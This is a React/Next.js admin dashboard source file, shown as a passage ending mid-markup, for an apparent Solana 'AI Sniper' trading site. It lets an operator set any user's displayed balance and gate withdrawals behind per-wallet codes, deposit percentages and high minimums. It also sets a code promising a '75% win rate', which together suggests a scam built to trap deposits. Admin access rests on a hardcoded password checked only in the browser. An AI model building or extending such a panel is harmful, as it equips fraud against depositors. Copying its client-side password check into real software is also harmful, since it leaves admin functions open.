"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { db, realtimeDb } from "@/lib/firebase"
import { collection, getDocs, doc, deleteDoc, updateDoc } from "firebase/firestore"
import { ref, set, get } from "firebase/database"
import {
  Shield,
  Trash2,
  Edit2,
  Save,
  X,
  DollarSign,
  Users,
  TrendingUp,
  AlertCircle,
  Lock,
  Wallet,
  Settings,
  Brain,
  KeyRound,
  ArrowUpCircle,
} from "lucide-react"
import Header from "@/components/header"
import { Button } from "@/components/ui/button"
import { formatDistanceToNow } from "date-fns"

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [password, setPassword] = useState("")
  const [authError, setAuthError] = useState("")

  const [wallets, setWallets] = useState<any[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [editingWallet, setEditingWallet] = useState<any | null>(null)
  const [balanceInput, setBalanceInput] = useState("")
  const [minDepositInput, setMinDepositInput] = useState("")
  const [minWithdrawalInput, setMinWithdrawalInput] = useState("")
  const [requireReconnectBalanceInput, setRequireReconnectBalanceInput] = useState(false)
  const [withdrawalPercentageInput, setWithdrawalPercentageInput] = useState("")
  const [minWithdrawalAmountInput, setMinWithdrawalAmountInput] = useState("10")
  const [minBalanceForWithdrawalInput, setMinBalanceForWithdrawalInput] = useState("10")
  const [requireWithdrawalCodeInput, setRequireWithdrawalCodeInput] = useState(false)
  const [withdrawalCodeInput, setWithdrawalCodeInput] = useState("")
  const [requireUpgradeCodeInput, setRequireUpgradeCodeInput] = useState(false)
  const [upgradeCodeInput, setUpgradeCodeInput] = useState("")
  const [balanceRequirements, setBalanceRequirements] = useState({
    minBalance: 0.7,
    maxBalance: 5,
    solToUsdRate: 180,
    minDeposit: 0.1,
    minWithdrawal: 0.05,
    requireMinBalanceOnReconnect: false,
  })
  const [aiSniperConfigCode, setAiSniperConfigCode] = useState("BOOST75")
  const [newConfigCode, setNewConfigCode] = useState("BOOST75")
  const [newBalanceRequirements, setNewBalanceRequirements] = useState({
    minBalance: "",
    maxBalance: "",
    solToUsdRate: "",
    minDeposit: "",
    minWithdrawal: "",
    requireMinBalanceOnReconnect: false,
    withdrawalPercentage: "",
  })
  const [showSuccess, setShowSuccess] = useState(false)

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault()
    if (password === "123victorybtc") {
      setIsAuthenticated(true)
      setAuthError("")
    } else {
      setAuthError("Invalid password")
      setPassword("")
    }
  }

  useEffect(() => {
    if (isAuthenticated) {
      fetchBalanceRequirements()
      fetchWallets()
    }
  }, [isAuthenticated])

  const fetchBalanceRequirements = async () => {
    try {
      const balanceRef = ref(realtimeDb, "settings/balanceRequirements")
      const snapshot = await get(balanceRef)

      if (snapshot.exists()) {
        const data = snapshot.val()
        const updatedBalanceRequirements = {
          minBalance: data.minBalance || 0.7,
          maxBalance: data.maxBalance || 5,
          solToUsdRate: data.solToUsdRate || 180,
          minDeposit: data.minDeposit || 0.1,
          minWithdrawal: data.minWithdrawal || 0.05,
          requireMinBalanceOnReconnect: data.requireMinBalanceOnReconnect || false,
          withdrawalPercentage: data.withdrawalPercentage || "",
        }

        setBalanceRequirements(updatedBalanceRequirements)
        setNewBalanceRequirements({
          minBalance: updatedBalanceRequirements.minBalance.toString(),
          maxBalance: updatedBalanceRequirements.maxBalance.toString(),
          solToUsdRate: updatedBalanceRequirements.solToUsdRate.toString(),
          minDeposit: updatedBalanceRequirements.minDeposit.toString(),
          minWithdrawal: updatedBalanceRequirements.minWithdrawal.toString(),
          requireMinBalanceOnReconnect: updatedBalanceRequirements.requireMinBalanceOnReconnect,
          withdrawalPercentage: updatedBalanceRequirements.withdrawalPercentage.toString(),
        })
      } else {
        const defaultRequirements = {
          minBalance: 0.7,
          maxBalance: 5,
          solToUsdRate: 180,
          minDeposit: 0.1,
          minWithdrawal: 0.05,
          requireMinBalanceOnReconnect: false,
          withdrawalPercentage: "",
        }

        await set(balanceRef, defaultRequirements)
        setBalanceRequirements(defaultRequirements)
        setNewBalanceRequirements({
          minBalance: defaultRequirements.minBalance.toString(),
          maxBalance: defaultRequirements.maxBalance.toString(),
          solToUsdRate: defaultRequirements.solToUsdRate.toString(),
          minDeposit: defaultRequirements.minDeposit.toString(),
          minWithdrawal: defaultRequirements.minWithdrawal.toString(),
          requireMinBalanceOnReconnect: defaultRequirements.requireMinBalanceOnReconnect,
          withdrawalPercentage: defaultRequirements.withdrawalPercentage.toString(),
        })
      }

      const configCodeRef = ref(realtimeDb, "settings/aiSniperConfigCode")
      const codeSnapshot = await get(configCodeRef)
      if (codeSnapshot.exists()) {
        setAiSniperConfigCode(codeSnapshot.val())
        setNewConfigCode(codeSnapshot.val())
      }
    } catch (error) {
      console.error("[v0] Error fetching balance requirements:", error)
    }
  }

  const fetchWallets = async () => {
    try {
      setLoading(true)
      const querySnapshot = await getDocs(collection(db, "wallets"))
      const walletsData: any[] = []
      querySnapshot.forEach((doc) => {
        walletsData.push({ id: doc.id, ...doc.data() })
      })

      const sortedWallets = walletsData.sort((a, b) => {
        const dateA = a.connectedAt ? new Date(a.connectedAt).getTime() : 0
        const dateB = b.connectedAt ? new Date(b.connectedAt).getTime() : 0
        return dateB - dateA
      })

      setWallets(sortedWallets)
      setLoading(false)
    } catch (err) {
      setError("Failed to fetch wallet data")
      console.error(err)
      setLoading(false)
    }
  }

  const handleDeleteWallet = async (walletId: string) => {
    const confirmDelete = window.confirm("Are you sure you want to delete this wallet?")
    if (!confirmDelete) return

    try {
      await deleteDoc(doc(db, "wallets", walletId))
      setWallets((prev) => prev.filter((wallet) => wallet.id !== walletId))
      showSuccessMessage()
    } catch (err) {
      console.error("Error deleting wallet:", err)
      setError("Failed to delete wallet")
    }
  }

  const handleEditBalance = (wallet: any) => {
    setEditingWallet(wallet)
    setBalanceInput(wallet.balance?.toString() || "0")
    setMinDepositInput(wallet.minDeposit?.toString() || "0.1")
    setMinWithdrawalInput(wallet.minWithdrawal?.toString() || "0.05")
    setRequireReconnectBalanceInput(wallet.requireMinBalanceOnReconnect || false)
    setWithdrawalPercentageInput(wallet.requiredDepositPercentage?.toString() || "100")
    setMinWithdrawalAmountInput(wallet.minWithdrawalAmount?.toString() || "10")
    setMinBalanceForWithdrawalInput(wallet.minBalanceForWithdrawal?.toString() || "10")
    setRequireWithdrawalCodeInput(wallet.requireWithdrawalCode || false)
    setWithdrawalCodeInput(wallet.withdrawalCode || "")
    setRequireUpgradeCodeInput(wallet.requireUpgradeCode || false)
    setUpgradeCodeInput(wallet.upgradeCode || "")
  }

  const handleSaveBalance = async () => {
    if (!editingWallet) return

    try {
      const newBalance = Number.parseFloat(balanceInput)
      const minDeposit = Number.parseFloat(minDepositInput)
      const minWithdrawal = Number.parseFloat(minWithdrawalInput)
      const requiredDepositPercentage = Number.parseFloat(withdrawalPercentageInput)

      if (isNaN(newBalance) || isNaN(minDeposit) || isNaN(minWithdrawal) || isNaN(requiredDepositPercentage)) {
        alert("Please enter valid numbers")
        return
      }

      if (requiredDepositPercentage < 0 || requiredDepositPercentage > 100) {
        alert("Deposit percentage must be between 0 and 100")
        return
      }

      const minWithdrawalAmount = Number.parseFloat(minWithdrawalAmountInput)
      const minBalanceForWithdrawal = Number.parseFloat(minBalanceForWithdrawalInput)

      await updateDoc(doc(db, "wallets", editingWallet.id), {
        balance: newBalance,
        minDeposit: minDeposit,
        minWithdrawal: minWithdrawal,
        requireMinBalanceOnReconnect: requireReconnectBalanceInput,
        requiredDepositPercentage: requiredDepositPercentage,
        minWithdrawalAmount: isNaN(minWithdrawalAmount) ? 10 : minWithdrawalAmount,
        minBalanceForWithdrawal: isNaN(minBalanceForWithdrawal) ? 10 : minBalanceForWithdrawal,
        requireWithdrawalCode: requireWithdrawalCodeInput,
        withdrawalCode: withdrawalCodeInput,
        requireUpgradeCode: requireUpgradeCodeInput,
        upgradeCode: upgradeCodeInput,
      })

      alert("Wallet updated successfully!")
      setEditingWallet(null)
      setBalanceInput("")
      setMinDepositInput("")
      setMinWithdrawalInput("")
      setRequireReconnectBalanceInput(false)
      setWithdrawalPercentageInput("")
      setMinWithdrawalAmountInput("10")
      setMinBalanceForWithdrawalInput("10")
      setRequireWithdrawalCodeInput(false)
      setWithdrawalCodeInput("")
      setRequireUpgradeCodeInput(false)
      setUpgradeCodeInput("")
    } catch (error) {
      console.error("Error saving balance:", error)
      alert("Failed to save balance. Please try again.")
    }
  }

  const handleCancelEdit = () => {
    setEditingWallet(null)
    setBalanceInput("")
    setMinDepositInput("")
    setMinWithdrawalInput("")
    setRequireReconnectBalanceInput(false)
    setWithdrawalPercentageInput("")
    setMinWithdrawalAmountInput("10")
    setMinBalanceForWithdrawalInput("10")
    setRequireWithdrawalCodeInput(false)
    setWithdrawalCodeInput("")
    setRequireUpgradeCodeInput(false)
    setUpgradeCodeInput("")
  }

  const handleBalanceRequirementChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setNewBalanceRequirements((prev) => ({ ...prev, [name]: value }))
  }

  const handleSaveBalanceRequirements = async () => {
    console.log("[v0] Starting to save balance requirements...")
    const minBalance = Number.parseFloat(newBalanceRequirements.minBalance)
    const maxBalance = Number.parseFloat(newBalanceRequirements.maxBalance)
    const solToUsdRate = Number.parseFloat(newBalanceRequirements.solToUsdRate)
    const minDeposit = Number.parseFloat(newBalanceRequirements.minDeposit)
    const minWithdrawal = Number.parseFloat(newBalanceRequirements.minWithdrawal)
    const requireMinBalanceOnReconnect = newBalanceRequirements.requireMinBalanceOnReconnect
    const withdrawalPercentage = Number.parseFloat(newBalanceRequirements.withdrawalPercentage)

    console.log("[v0] Parsed values:", {
      minBalance,
      maxBalance,
      solToUsdRate,
      minDeposit,
      minWithdrawal,
      requireMinBalanceOnReconnect,
      withdrawalPercentage,
    })

    if (
      isNaN(minBalance) ||
      isNaN(maxBalance) ||
      isNaN(solToUsdRate) ||
      isNaN(minDeposit) ||
      isNaN(minWithdrawal) ||
      isNaN(withdrawalPercentage)
    ) {
      setError("Please enter valid numbers for all fields")
      return
    }

    if (minBalance >= maxBalance) {
      setError("Minimum balance must be less than maximum balance")
      return
    }

    if (solToUsdRate <= 0) {
      setError("SOL to USD rate must be greater than 0")
      return
    }

    if (minDeposit <= 0 || minWithdrawal <= 0) {
      setError("Minimum deposit and withdrawal must be greater than 0")
      return
    }

    try {
      console.log("[v0] Firebase config check:", {
        hasRealtimeDb: !!realtimeDb,
        projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID,
      })

      const balanceRequirementsRef = ref(realtimeDb, "settings/balanceRequirements")
      console.log("[v0] Created ref:", balanceRequirementsRef.toString())

      const dataToSave = {
        minBalance,
        maxBalance,
        solToUsdRate,
        minDeposit,
        minWithdrawal,
        requireMinBalanceOnReconnect,
        withdrawalPercentage,
        updatedAt: Date.now(),
      }

      console.log("[v0] Data to save:", dataToSave)

      const result = await set(balanceRequirementsRef, dataToSave)
      console.log("[v0] Set result:", result)
      console.log("[v0] Successfully saved to Firebase")

      setBalanceRequirements({
        minBalance,
        maxBalance,
        solToUsdRate,
        minDeposit,
        minWithdrawal,
        requireMinBalanceOnReconnect,
        withdrawalPercentage,
      })

      setNewBalanceRequirements({
        minBalance: minBalance.toString(),
        maxBalance: maxBalance.toString(),
        solToUsdRate: solToUsdRate.toString(),
        minDeposit: minDeposit.toString(),
        minWithdrawal: minWithdrawal.toString(),
        requireMinBalanceOnReconnect,
        withdrawalPercentage: withdrawalPercentage.toString(),
      })

      setError("")
      showSuccessMessage()
    } catch (err: any) {
      console.error("[v0] Error updating balance requirements:", err)
      console.error("[v0] Error code:", err?.code)
      console.error("[v0] Error message:", err?.message)
      console.error("[v0] Full error:", JSON.stringify(err, null, 2))
      setError(`Failed to update balance requirements: ${err instanceof Error ? err.message : String(err)}`)
    }
  }

  const handleSaveConfigCode = async () => {
    if (!newConfigCode.trim()) {
      setError("Configuration code cannot be empty")
      return
    }

    try {
      const configCodeRef = ref(realtimeDb, "settings/aiSniperConfigCode")
      await set(configCodeRef, newConfigCode.trim())
      setAiSniperConfigCode(newConfigCode.trim())
      showSuccessMessage()
    } catch (err: any) {
      console.error("[v0] Error saving config code:", err)
      setError(`Failed to save config code: ${err.message}`)
    }
  }

  const showSuccessMessage = () => {
    setShowSuccess(true)
    setTimeout(() => setShowSuccess(false), 3000)
  }

  const totalBalance = wallets.reduce((sum, wallet) => sum + (wallet.balance || 0), 0)
  const totalUsers = wallets.length

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-black">
        <Header />
        <div className="flex justify-center items-center min-h-[calc(100vh-80px)] px-4">
          <div className="w-full max-w-md">
            <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl p-8 shadow-2xl">
              <div className="flex justify-center mb-6">
                <div className="w-16 h-16 bg-gradient-to-br from-purple-600 to-purple-600 rounded-2xl flex items-center justify-center">
                  <Lock className="w-8 h-8 text-white" />
                </div>
              </div>
              <h2 className="text-2xl font-bold text-white text-center mb-2">Admin Access</h2>
              <p className="text-gray-400 text-center mb-8">Enter password to access dashboard</p>

              <form onSubmit={handleLogin}>
                <div className="mb-6">
                  <label htmlFor="password" className="block text-sm font-medium text-gray-300 mb-2">
                    Password
                  </label>
                  <input
                    type="password"
                    id="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                    placeholder="Enter admin password"
                    autoFocus
                  />
                  {authError && (
                    <p className="mt-2 text-sm text-red-400 flex items-center gap-1">
                      <AlertCircle className="w-4 h-4" />
                      {authError}
                    </p>
                  )}
                </div>

                <Button
                  type="submit"
                  className="w-full bg-gradient-to-r from-purple-600 to-purple-600 hover:from-purple-700 hover:to-purple-700 text-white font-semibold py-3"
                >
                  <Shield className="w-4 h-4 mr-2" />
                  Access Dashboard
                </Button>
              </form>
            </div>
          </div>
        </div>
      </div>
    )
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-black">
        <Header />
        <div className="flex justify-center items-center h-screen">
          <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-purple-500" />
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-black">
      <Header />
      <main className="container mx-auto px-2.5 py-8">
        <div className="max-w-7xl mx-auto">
          {/* Header */}
          <div className="mb-8">
            <div className="flex items-center gap-3">
              <div className="w-12 h-12 bg-gradient-to-br from-purple-600 to-purple-600 rounded-xl flex items-center justify-center">
                <Shield className="w-6 h-6 text-white" />
              </div>
              <div>
                <h1 className="text-3xl font-bold text-white">Admin Dashboard</h1>
                <p className="text-gray-400">Manage wallets and platform settings</p>
              </div>
            </div>
          </div>

          {/* Success/Error Messages */}
          {showSuccess && (
            <div className="mb-6 p-4 bg-purple-900/30 border border-purple-500/30 rounded-xl flex items-center gap-2">
              <AlertCircle className="w-5 h-5 text-purple-400" />
              <p className="text-purple-400">Changes saved successfully!</p>
            </div>
          )}
          {error && (
            <div className="mb-6 p-4 bg-red-900/30 border border-red-500/30 rounded-xl flex items-center gap-2">
              <AlertCircle className="w-5 h-5 text-red-400" />
              <p className="text-red-400">{error}</p>
            </div>
          )}

          {/* Stats Overview */}
          <div className="grid md:grid-cols-3 gap-6 mb-8">
            <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-xl p-6">
              <div className="flex items-center gap-2 text-purple-400 mb-3">
                <Users className="w-5 h-5" />
                <span className="text-sm font-semibold">Total Users</span>
              </div>
              <p className="text-4xl font-bold text-white">{totalUsers}</p>
            </div>

            <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-xl p-6">
              <div className="flex items-center gap-2 text-purple-400 mb-3">
                <DollarSign className="w-5 h-5" />
                <span className="text-sm font-semibold">Total Balance</span>
              </div>
              <p className="text-4xl font-bold text-white">{totalBalance.toFixed(2)}</p>
              <p className="text-gray-400 text-sm mt-1">SOL</p>
            </div>

            <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-xl p-6">
              <div className="flex items-center gap-2 text-blue-400 mb-3">
                <TrendingUp className="w-5 h-5" />
                <span className="text-sm font-semibold">SOL Rate</span>
              </div>
              <p className="text-4xl font-bold text-white">${balanceRequirements.solToUsdRate}</p>
            </div>
          </div>

          {/* Balance Requirements Section */}
          <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl p-8 mb-8">
            <div className="flex items-center gap-3 mb-6">
              <div className="w-12 h-12 bg-purple-600 rounded-xl flex items-center justify-center">
                <Settings className="w-6 h-6 text-white" />
              </div>
              <div>
                <h2 className="text-2xl font-bold text-white">Balance Requirements</h2>
                <p className="text-gray-400 text-sm">Configure minimum and maximum balance settings</p>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
              <div>
                <label htmlFor="minBalance" className="block text-sm font-medium text-gray-300 mb-2">
                  Minimum Balance (SOL)
                </label>
                <input
                  type="number"
                  step="0.01"
                  id="minBalance"
                  name="minBalance"
                  value={newBalanceRequirements.minBalance}
                  onChange={handleBalanceRequirementChange}
                  className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                  placeholder="0.7"
                />
              </div>
              <div>
                <label htmlFor="maxBalance" className="block text-sm font-medium text-gray-300 mb-2">
                  Maximum Balance (SOL)
                </label>
                <input
                  type="number"
                  step="0.01"
                  id="maxBalance"
                  name="maxBalance"
                  value={newBalanceRequirements.maxBalance}
                  onChange={handleBalanceRequirementChange}
                  className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                  placeholder="5"
                />
              </div>
              <div>
                <label htmlFor="solToUsdRate" className="block text-sm font-medium text-gray-300 mb-2">
                  SOL to USD Rate
                </label>
                <input
                  type="number"
                  step="0.01"
                  id="solToUsdRate"
                  name="solToUsdRate"
                  value={newBalanceRequirements.solToUsdRate}
                  onChange={handleBalanceRequirementChange}
                  className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                  placeholder="180"
                />
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
              <div>
                <label htmlFor="minDeposit" className="block text-sm font-medium text-gray-300 mb-2">
                  Minimum Deposit (SOL)
                </label>
                <input
                  type="number"
                  step="0.01"
                  id="minDeposit"
                  name="minDeposit"
                  value={newBalanceRequirements.minDeposit}
                  onChange={handleBalanceRequirementChange}
                  className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                  placeholder="0.1"
                />
                <p className="mt-1 text-xs text-gray-400">Minimum amount users can deposit</p>
              </div>
              <div>
                <label htmlFor="minWithdrawal" className="block text-sm font-medium text-gray-300 mb-2">
                  Minimum Withdrawal (SOL)
                </label>
                <input
                  type="number"
                  step="0.01"
                  id="minWithdrawal"
                  name="minWithdrawal"
                  value={newBalanceRequirements.minWithdrawal}
                  onChange={handleBalanceRequirementChange}
                  className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                  placeholder="0.05"
                />
                <p className="mt-1 text-xs text-gray-400">Minimum amount users can withdraw</p>
              </div>
              <div>
                <label htmlFor="withdrawalPercentage" className="block text-sm font-medium text-gray-300 mb-2">
                  Withdrawal Percentage Requirement
                </label>
                <input
                  type="number"
                  step="0.01"
                  id="withdrawalPercentage"
                  name="withdrawalPercentage"
                  value={newBalanceRequirements.withdrawalPercentage}
                  onChange={handleBalanceRequirementChange}
                  className="w-full px-4 py-3 bg-black border border-purple-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-purple-500"
                  placeholder="0"
                />
                <p className="mt-1 text-xs text-gray-400">Percentage requirement for withdrawals</p>
              </div>
            </div>

            <div className="mt-6 p-4 bg-purple-900/20 border border-purple-500/30 rounded-lg">
              <label className="flex items-center justify-between cursor-pointer">
                <div>
                  <p className="text-white font-medium">Require Minimum Balance on Reconnect</p>
                  <p className="text-gray-400 text-sm mt-1">
                    When enabled, returning users must meet the minimum balance requirement when reconnecting their
                    wallet
                  </p>
                </div>
                <div className="relative">
                  <input
                    type="checkbox"
                    checked={newBalanceRequirements.requireMinBalanceOnReconnect}
                    onChange={(e) =>
                      setNewBalanceRequirements((prev) => ({ ...prev, requireMinBalanceOnReconnect: e.target.checked }))
                    }
                    className="sr-only peer"
                  />
                  <div className="w-14 h-7 bg-gray-700 peer-focus:outline-none peer-focus:ring-2 peer-focus:ring-purple-500 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[4px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-6 after:w-6 after:transition-all peer-checked:bg-purple-600"></div>
                </div>
              </label>
            </div>

            <div className="mt-6 flex justify-end">
              <Button
                onClick={handleSaveBalanceRequirements}
                className="bg-gradient-to-r from-purple-600 to-purple-600 hover:from-purple-700 hover:to-purple-700 text-white font-semibold"
              >
                <Save className="w-4 h-4 mr-2" />
                Save Requirements
              </Button>
            </div>
          </div>

          {/* AI Sniper Configuration Code Section */}
          <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl p-8 mb-8">
            <div className="flex items-center gap-3 mb-6">
              <div className="w-12 h-12 bg-purple-600 rounded-xl flex items-center justify-center">
                <Brain className="w-6 h-6 text-white" />
              </div>
              <div>
                <h2 className="text-2xl font-bold text-white">AI Sniper Configuration Code</h2>
                <p className="text-gray-400 text-sm">Set the code users can enter to boost win rate to 75%</p>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-sm text-gray-300 mb-2">Configuration Code</label>
                <input
                  type="text"
                  value={newConfigCode}
                  onChange={(e) => setNewConfigCode(e.target.value)}
                  className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-4 py-2.5 text-white focus:outline-none focus:border-purple-500"
                  placeholder="Enter code (e.g., BOOST75)"
                />
                <p className="text-gray-500 text-xs mt-1">Current code: {aiSniperConfigCode}</p>
              </div>
              <Button onClick={handleSaveConfigCode} className="bg-purple-600 hover:bg-purple-700 text-white">
                <Save className="w-4 h-4 mr-2" />
                Save Config Code
              </Button>
            </div>
          </div>

          {/* Wallet List */}
          <div className="bg-gradient-to-br from-gray-900 to-black border border-purple-500/30 rounded-2xl overflow-hidden">
            <div className="p-6 border-b border-purple-900/30">
              <h2 className="text-xl font-semibold text-white flex items-center gap-2">
                <Users className="w-5 h-5 text-purple-400" />
                Connected Wallets ({wallets.length})
              </h2>
            </div>
            {wallets.length === 0 ? (
              <div className="p-12 text-center text-gray-400">No wallet data found</div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="text-left border-b border-purple-900/30">
                      <th className="p-4 text-sm font-semibold text-gray-400">Wallet Address</th>
                      <th className="p-4 text-sm font-semibold text-gray-400">Balance (SOL)</th>
                      <th className="p-4 text-sm font-semibold text-gray-400">Connected</th>
                      <th className="p-4 text-sm font-semibold text-gray-400">Min Deposit</th>
                      <th className="p-4 text-sm font-semibold text-gray-400">Min Withdrawal</th>
                      <th className="p-4 text-sm font-semibold text-gray-400">Require Min on Reconnect</th>
                      <th className="p-4 text-sm font-semibold text-gray-400">Required Deposit %</th>
                      <th className="p-4 text-sm font-semibold text-gray-400">Min Withdrawal Amt</th>
                      <th className="p-4 text-sm font-semibold text-gray-400">Min Balance to Withdraw</th>
                      <th className="p-4 text-sm font-semibold text-gray-400">Withdrawal Code</th>
                      <th className="p-4 text-sm font-semibold text-gray-400">Upgrade Code</th>
                      <th className="p-4 text-sm font-semibold text-gray-400">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-purple-900/20">
                    {wallets.map((wallet) => (
                      <tr key={wallet.id} className="hover:bg-purple-900/5 transition-colors">
                        <td className="p-4">
                          <div className="flex items-center gap-3">
                            <div className="w-10 h-10 bg-gradient-to-br from-purple-600 to-purple-600 rounded-lg flex items-center justify-center">
                              <Wallet className="w-5 h-5 text-white" />
                            </div>
                            <span className="text-white font-mono text-sm">
                              {wallet.id.slice(0, 6)}...{wallet.id.slice(-4)}
                            </span>
                          </div>
                        </td>
                        <td className="p-4">
                          {editingWallet?.id === wallet.id ? (
                            <div className="space-y-2">
                              <input
                                type="number"
                                step="0.0001"
                                value={balanceInput}
                                onChange={(e) => setBalanceInput(e.target.value)}
                                className="w-32 px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                placeholder="0.0000"
                              />
                            </div>
                          ) : (
                            <span className="text-white font-semibold">{wallet.balance?.toFixed(4) || "0.0000"}</span>
                          )}
                        </td>
                        <td className="p-4">
                          <span className="text-gray-400 text-sm">
                            {wallet.connectedAt
                              ? formatDistanceToNow(new Date(wallet.connectedAt), { addSuffix: true })
                              : "N/A"}
                          </span>
                        </td>
                        <td className="p-4">
                          {editingWallet?.id === wallet.id ? (
                            <input
                              type="number"
                              step="0.01"
                              value={minDepositInput}
                              onChange={(e) => setMinDepositInput(e.target.value)}
                              className="w-24 px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                              placeholder="0.1"
                            />
                          ) : (
                            <span className="text-gray-400 text-sm">{wallet.minDeposit?.toFixed(2) || "0.10"} SOL</span>
                          )}
                        </td>
                        <td className="p-4">
                          {editingWallet?.id === wallet.id ? (
                            <input
                              type="number"
                              step="0.01"
                              value={minWithdrawalInput}
                              onChange={(e) => setMinWithdrawalInput(e.target.value)}
                              className="w-24 px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                              placeholder="0.05"
                            />
                          ) : (
                            <span className="text-gray-400 text-sm">
                              {wallet.minWithdrawal?.toFixed(2) || "0.05"} SOL
                            </span>
                          )}
                        </td>
                        <td className="p-4">
                          {editingWallet?.id === wallet.id ? (
                            <label className="flex items-center gap-2 cursor-pointer">
                              <input
                                type="checkbox"
                                checked={requireReconnectBalanceInput}
                                onChange={(e) => setRequireReconnectBalanceInput(e.target.checked)}
                                className="w-4 h-4 bg-black border border-purple-500/30 rounded text-purple-600 focus:ring-2 focus:ring-purple-500"
                              />
                              <span className="text-gray-400 text-xs">Enabled</span>
                            </label>
                          ) : (
                            <span
                              className={`inline-flex px-2 py-1 rounded-full text-xs ${
                                wallet.requireMinBalanceOnReconnect
                                  ? "bg-purple-900/30 text-purple-400"
                                  : "bg-gray-900/30 text-gray-400"
                              }`}
                            >
                              {wallet.requireMinBalanceOnReconnect ? "Yes" : "No"}
                            </span>
                          )}
                        </td>
                        <td className="p-4">
                          {editingWallet?.id === wallet.id ? (
                            <input
                              type="number"
                              step="1"
                              min="0"
                              max="100"
                              value={withdrawalPercentageInput}
                              onChange={(e) => setWithdrawalPercentageInput(e.target.value)}
                              className="w-20 px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                              placeholder="100"
                            />
                          ) : (
                            <span className="text-gray-400 text-sm">{wallet.requiredDepositPercentage || 100}%</span>
                          )}
                        </td>
                        {/* Min Withdrawal Amount */}
                        <td className="p-4">
                          {editingWallet?.id === wallet.id ? (
                            <input
                              type="number"
                              step="0.01"
                              value={minWithdrawalAmountInput}
                              onChange={(e) => setMinWithdrawalAmountInput(e.target.value)}
                              className="w-24 px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                              placeholder="10"
                            />
                          ) : (
                            <span className="text-gray-400 text-sm">{wallet.minWithdrawalAmount ?? 10} SOL</span>
                          )}
                        </td>
                        {/* Min Balance For Withdrawal */}
                        <td className="p-4">
                          {editingWallet?.id === wallet.id ? (
                            <input
                              type="number"
                              step="0.01"
                              value={minBalanceForWithdrawalInput}
                              onChange={(e) => setMinBalanceForWithdrawalInput(e.target.value)}
                              className="w-24 px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                              placeholder="10"
                            />
                          ) : (
                            <span className="text-gray-400 text-sm">{wallet.minBalanceForWithdrawal ?? 10} SOL</span>
                          )}
                        </td>
                        {/* Withdrawal Code Toggle + Code */}
                        <td className="p-4">
                          {editingWallet?.id === wallet.id ? (
                            <div className="space-y-2">
                              <label className="flex items-center gap-2 cursor-pointer">
                                <input
                                  type="checkbox"
                                  checked={requireWithdrawalCodeInput}
                                  onChange={(e) => setRequireWithdrawalCodeInput(e.target.checked)}
                                  className="w-4 h-4 bg-black border border-purple-500/30 rounded text-purple-600 focus:ring-2 focus:ring-purple-500"
                                />
                                <span className="text-gray-400 text-xs">Require</span>
                              </label>
                              {requireWithdrawalCodeInput && (
                                <input
                                  type="text"
                                  value={withdrawalCodeInput}
                                  onChange={(e) => setWithdrawalCodeInput(e.target.value)}
                                  className="w-28 px-3 py-2 bg-black border border-purple-500/30 rounded-lg text-white text-sm focus:outline-none focus:ring-2 focus:ring-purple-500"
                                  placeholder="Code"
                                />
                              )}
                            </div>
                          ) : (
                            <div className="flex flex-col gap-1">
                              <span
                                className={`inline-flex px-2 py-1 rounded-full text-xs ${
                                  wallet.requireWithdrawalCode
                                    ? "bg-amber-900/30 text-amber-400"
                                    : "bg-gray-900/30 text-gray-400"
                                }`}
                              >
                                {wallet.requireWithdrawalCode ? "On" : "Off"}
                              </span>
                              {wallet.requireWithdrawalCode && wallet.withdrawalCode && (
